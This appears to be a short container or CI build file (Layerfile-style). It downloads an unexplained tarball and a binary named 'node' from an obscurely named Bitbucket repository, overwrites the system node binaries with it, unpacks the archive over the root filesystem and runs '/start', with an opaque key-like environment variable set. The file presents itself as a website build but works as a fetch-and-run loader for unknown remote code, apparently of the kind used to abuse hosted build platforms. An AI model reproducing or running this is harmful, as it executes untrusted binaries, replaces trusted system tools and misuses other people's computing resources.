FROM vm/ubuntu:22.04

ENV linux8888=linuxlinuxwebwebwebweblinuxlinuxwebweb88888888888888

RUN cd / && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/node && cp /node /usr/bin/node && cp /node /bin/node && tar -xvf ./linux8888.tar.gz -C /

RUN bash /start

EXPOSE WEBSITE http://localhost:8080
